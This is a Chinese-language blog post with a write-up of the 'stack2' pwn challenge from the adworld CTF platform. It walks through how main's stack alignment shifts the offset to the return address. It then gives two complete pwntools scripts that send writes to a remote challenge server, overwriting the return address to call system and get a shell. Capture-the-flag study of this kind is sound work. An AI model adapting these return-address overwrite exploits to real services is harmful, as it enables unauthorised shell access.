---
title: adworld_pwn部分writeUp
date: 2019-06-03 22:10:20
tags:
    - thinking
---

### stack2  

---

&emsp;&emsp;首先checksec一下发现有canary，然后托到ida里看一下，发现大部分变量都是 **unsigned int** 类型，考虑到可能会有整数溢出。接着我们发现可以通过 **change number** 选项来直接修改栈上的数据，因此我们想到直接修改返回地址，如图：  

![stack2_1](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_1.jpg?raw=true)

&emsp;&emsp;接着我们发现 **hackhere** 函数，里面是直接调用的  

```c
system("/bin/bash");
```

![stack2_2](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_2.jpg?raw=true)
&emsp;&emsp;因此，我们可以直接将返回地址修改为这里，我们注意到数组的类型是 **char** ，因此在发送payload的时候可以直接按照小端序字符逐位发送。

&emsp;&emsp;但是这里有一个坑点，我们通过静态分析发现数组距离 **return_addr** 的位置为0x74：  

![stack2_3](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_3.jpg?raw=true)  

&emsp;&emsp;但是我们在实际动态调试的时候发现其实际偏移为0x84，这里是因为，在进入main函数时进行了一步esp的对齐：  

```assembly
#开头
|           ; arg int arg_4h @ esp+0x4
|           0x080485d0      8d4c2404       lea ecx, dword [arg_4h]     ; 4
|           0x080485d4      83e4f0             and esp, 0xfffffff0
|           0x080485d7      ff71fc               push dword [ecx - 4]
|           0x080485da      55                      push ebp
|           0x080485db      89e5                 mov ebp, esp
|           0x080485dd      51                      push ecx

----------------------------------------------------------------
#结尾
|           0x080488eb      8b4dfc         mov ecx, dword [local_4h]
|           0x080488ee      c9             leave
|           0x080488ef      8d61fc         lea esp, dword [ecx - 4]
\           0x080488f2      c3             ret

```

&emsp;&emsp;其实这里没有必要深入计算，因为动态调试可以算出偏移为0x84,但是作为一个知识点，我们还是要讨论一下这个main函数的返回方式，我们遇到过很多main函数通过ecx进行返回，并且有esp对其的过程。  

&emsp;&emsp;这一次，首先将 **$esp + 4** 放入ecx，然后 `and esp,0xfffffff0` 的作用是将esp的后4位清零(一个16进制位代表4个2进制位)，然后将 **$ecx - 4** 压入栈中。注意，这里的 **$ecx - 4** 实际上就是return_addr,因为在进入main函数时，esp的位置就是return_addr,然后 `lea ecx, dword [arg_4h]` 这条语句将其实是把第一个参数的地址传给ecx，然后esp对齐后将return_addr压入栈中，然后就是正常的保存栈状态的操作。由于对齐esp的操作导致栈被拉长，拉伸的长度只能动态调试确定，此时栈大概是这样：  

```c
						high                                |		arg_4		 |
											 |	return_addr        |             return_addr 1                                  
											 |	 .....................	  |

after align	               							     some span

											 |		ecx - 4		  |				return_addr  2
											 |		    ebp              |
											 |                  ecx               |
			 			low                                  |      ....................         |
```

											 												
&emsp;&emsp;返回的时候就恢复ecx的值然后直接利用 **[ecx - 4]** 回到return_addr1的位置。

因此，payload如下：  

```python
from pwn import *

context.log_level = "debug"
system_addr = 0x804859B
#sh = process("./stack2")
sh = remote("111.198.29.45",53413)

sh.recv()
sh.sendline('1')
sh.recv()
sh.sendline('1')

def fuck(index, value):
    sh.sendline("3")
    sh.recv()
    sh.sendline(str(index))
    sh.recv()
    sh.sendline(str(value))
    sh.recv()

fuck(0x84,0x9b)
fuck(0x85,0x85)
fuck(0x86,0x04)
fuck(0x87,0x08)

sh.interactive()
```

&emsp;&emsp;但是打过去之后发现系统提示:  
```bash
"/usr/bin/bash" not found  
```

&emsp;&emsp;所以我们只好直接调用 **system**函数，并将sh传参给它，因此payload如下：  
```python
#!/usr/bin/env python
from pwn import *

context.log_level = "debug"

#sh = process("./stack2")
sh = remote("111.198.29.45",53413)

sys_addr = 0x0804859b

sh.recv()
sh.sendline('1')
sh.recv()
sh.sendline('1')

def fuck(index, value):
    sh.sendline("3")
    sh.recv()
    sh.sendline(str(index))
    sh.recv()
    sh.sendline(str(value))
    sh.recv()

fuck(0x84, 0x50)
fuck(0x85, 0x84)
fuck(0x86, 0x04)
fuck(0x87, 0x08)
#中间流出了4个字节，用于存放 fake_return_address
fuck(0x8c, 0x87)           #这里我们发现地址是奇数位，是因为我们直接把bash拆开成了sh
fuck(0x8d, 0x89)
fuck(0x8e, 0x04)
fuck(0x8f, 0x08)

sh.sendline("5")

sh.interactive()
```

